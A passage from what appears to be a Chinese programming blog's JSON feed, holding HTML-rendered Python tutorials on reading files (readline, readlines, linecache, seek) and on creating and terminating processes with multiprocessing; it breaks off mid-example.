python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a.txt\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>line <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">while</span> line<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">print</span> line<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> line <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>输出结果：</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'str'</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Hello</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Welcome</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>What <span class=\"token keyword\">is</span> the fuck<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr></table></figure><h1 id=\"三-readlines\"><a class=\"anchor\" href=\"#三-readlines\">#</a> 三、readlines ()</h1>\n<p>readlines () 方法读取整个文件所有行，保存在一个列表 (list) 变量中，每行作为一个元素，但读取大文件会比较占内存</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a.txt\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>lines <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>lines<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> lines<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">print</span> line，</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>输出结果：</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'list'</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">2</span> Hello</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token number\">3</span> Welcome</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">4</span> What <span class=\"token keyword\">is</span> the fuck<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr></table></figure><h1 id=\"四-linecache模块\"><a class=\"anchor\" href=\"#四-linecache模块\">#</a> 四、linecache 模块</h1>\n<p>当然，有特殊需求还可以用 linecache 模块，比如你要输出某个文件的第 n 行：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 输出第 2 行</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>text <span class=\"token operator\">=</span> linecache<span class=\"token punctuation\">.</span>getline<span class=\"token punctuation\">(</span>‘a<span class=\"token punctuation\">.</span>txt'<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span> text<span class=\"token punctuation\">,</span></pre></td></tr></table></figure><h1 id=\"python-file-seek-方法\"><a class=\"anchor\" href=\"#python-file-seek-方法\">#</a> Python File seek () 方法</h1>\n<p>seek () 方法用于移动文件读取指针到指定位置。</p>\n<h2 id=\"语法\"><a class=\"anchor\" href=\"#语法\">#</a> 语法</h2>\n<p>seek () 方法语法如下：<br />\n <code>fileObject.seek(offset[, whence])</code></p>\n<h2 id=\"参数\"><a class=\"anchor\" href=\"#参数\">#</a> 参数</h2>\n<p>offset -- 开始的偏移量，也就是代表需要移动偏移的字节数</p>\n<ul>\n<li>whence：可选，默认值为 0。</li>\n<li>给 offset 参数一个定义，表示要从哪个位置开始偏移；0 代表从文件开头开始算起，1 代表从当前位置开始算起，2 代表从文件末尾算起。</li>\n</ul>\n<h2 id=\"返回值\"><a class=\"anchor\" href=\"#返回值\">#</a> 返回值</h2>\n<p>如果操作成功，则返回新的文件位置，如果操作失败，则函数返回 -1。</p>\n<h2 id=\"实例\"><a class=\"anchor\" href=\"#实例\">#</a> 实例</h2>\n<p>文件 runoob.txt 的内容如下：</p>\n<pre><code>1:www.runoob.com\n2:www.runoob.com\n3:www.runoob.com\n4:www.runoob.com\n5:www.runoob.com\n</code></pre>\n<p>循环读取文件的内容：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 打开文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fo <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"runoob.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rw+\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">\"文件名为: \"</span><span class=\"token punctuation\">,</span> fo<span class=\"token punctuation\">.</span>name</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>line <span class=\"token operator\">=</span> fo<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">\"读取的数据为: %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 重新设置文件读取指针到开头</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>fo<span class=\"token punctuation\">.</span>seek<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>line <span class=\"token operator\">=</span> fo<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">\"读取的数据为: %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 关闭文件</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>fo<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>以上实例输出结果为：</p>\n<pre><code>文件名为:  runoob.txt\n读取的数据为: 1:www.runoob.com\n\n读取的数据为: 1:www.runoob.com\n</code></pre>\n",
            "tags": [
                "python文件读取"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/python%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/",
            "url": "https://or0kit.github.io/Programming/Python/python%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/",
            "title": "python进程线程",
            "date_published": "2020-12-02T02:06:57.000Z",
            "content_html": "<h1 id=\"多进程\"><a class=\"anchor\" href=\"#多进程\">#</a> 多进程</h1>\n<p>multiprocessing 库</p>\n<h2 id=\"导入方法\"><a class=\"anchor\" href=\"#导入方法\">#</a> 导入方法</h2>\n<p>import mutiprocessing from Process</p>\n<h2 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h2>\n<h3 id=\"1-process01\"><a class=\"anchor\" href=\"#1-process01\">#</a> 1. process01</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>生活中，你可能一边听歌，一边写作业；一边上网，一边吃饭。。。这些都是生活中的多任务场景。电脑也可以执行多任务，比如你可以同时打开浏览器上网，听音乐，打开pycharm编写代码...。简单的说**多任务就是同一时间内运行多个程序**</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>- 单核CPU实现多任务原理：操作系统轮流让各个任务交替执行，QQ执行2us，切换到微信，在执行2us，再切换到陌陌，执行2us……。表面是看，每个任务反复执行下去，但是CPU调度执行速度太快了，导致我们感觉就行所有任务都在同时执行一样</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>- 多核CPU实现多任务原理：真正的秉性执行多任务只能在多核CPU上实现，但是由于任务数量远远多于CPU的核心数量，所以，操作西永也会自动把很多任务轮流调度到每个核心上执行</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>- 并发和并行</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  - **并发**：当有多个线程在操作时,如果系统只有一个CPU,则它根本不可能真正同时进行一个以上的线程，它只能把CPU运行时间划分成若干个时间段,再将时间 段分配给各个线程执行，在一个时间段的线程代码运行时，其它线程处于挂起状。.这种方式我们称之为并发(Concurrent)。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  - **并行**：当系统有一个以上CPU时,则线程的操作有可能非并发。当一个CPU执行一个线程时，另一个CPU可以执行另一个线程，两个线程互不抢占CPU资源，可以同时进行，这种方式我们称之为并行(Parallel)。</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>- 实现多任务的方式：</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  - 多进程模式；</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  - 多线程模式；</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  - 协程。</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  进程  >  线程  >  协程</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 进程创建</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Process</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是任务1.。。。。。。。。。。'</span><span class=\"token punctuation\">,</span>os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'------'</span><span class=\"token punctuation\">,</span>os<span class=\"token punctuation\">.</span>getppid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是任务2.。。。。。。。。。。'</span><span class=\"token punctuation\">,</span>os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'------'</span><span class=\"token punctuation\">,</span>os<span class=\"token punctuation\">.</span>getppid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\"># 子进程</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    p <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'任务1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    p<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    p1 <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task2<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'任务2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    p1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------------'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'*****************'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"2-process02\"><a class=\"anchor\" href=\"#2-process02\">#</a> 2. process02</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>生活中，你可能一边听歌，一边写作业；一边上网，一边吃饭。。。这些都是生活中的多任务场景。电脑也可以执行多任务，比如你可以同时打开浏览器上网，听音乐，打开pycharm编写代码...。简单的说**多任务就是同一时间内运行多个程序**</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>- 单核CPU实现多任务原理：操作系统轮流让各个任务交替执行，QQ执行2us，切换到微信，在执行2us，再切换到陌陌，执行2us……。表面是看，每个任务反复执行下去，但是CPU调度执行速度太快了，导致我们感觉就行所有任务都在同时执行一样</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>- 多核CPU实现多任务原理：真正的秉性执行多任务只能在多核CPU上实现，但是由于任务数量远远多于CPU的核心数量，所以，操作西永也会自动把很多任务轮流调度到每个核心上执行</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>- 并发和并行</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  - **并发**：当有多个线程在操作时,如果系统只有一个CPU,则它根本不可能真正同时进行一个以上的线程，它只能把CPU运行时间划分成若干个时间段,再将时间 段分配给各个线程执行，在一个时间段的线程代码运行时，其它线程处于挂起状。.这种方式我们称之为并发(Concurrent)。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  - **并行**：当系统有一个以上CPU时,则线程的操作有可能非并发。当一个CPU执行一个线程时，另一个CPU可以执行另一个线程，两个线程互不抢占CPU资源，可以同时进行，这种方式我们称之为并行(Parallel)。</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>- 实现多任务的方式：</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  - 多进程模式；</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  - 多线程模式；</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  - 协程。</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  进程  >  线程  >  协程</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  from multiprocessing import Process</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  process = Process(target= 函数，name=进程的名字，args=（给函数传递的参数）)</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  process 对象</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  对象调用方法:</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  process.start()    启动进程并执行任务</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  process.run()  只是执行了任务但是没有启动进程</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  terminate()   终止</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># 进程创建</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Process</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task1</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是任务1.。。。。。。。。。。'</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'------'</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>getppid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task2</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是任务2.。。。。。。。。。。'</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'------'</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>getppid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>number <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token comment\"># 子进程</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    p <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'任务1'</span><span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'aa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    p<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    p1 <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task2<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'任务2'</span><span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'bb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    p1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        number <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">if</span> number <span class=\"token operator\">==</span> <span class=\"token number\">100</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            p<span class=\"token punctuation\">.</span>terminate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>            p1<span class=\"token punctuation\">.</span>terminate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'---------------->number:'</span><span class=\"token punctuation\">,</span>number<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------------'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'*****************'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"3-process03\"><a class=\"anchor\" href=\"#3-process03\">#</a> 3. process03</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 进程创建</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> 多进程对于全局变量访问，在每一个全局变量里面都放一个m变量，</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> 保证每个进程访问变量互不干扰。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> m = 1  # 不可变类型</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> list1 = []  # 可变类型</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> 主进程启动子进程，启动之后无法控制是谁先谁后</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Process</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token number\">1</span>  <span class=\"token comment\"># 不可变类型</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>list1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 可变类型</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td 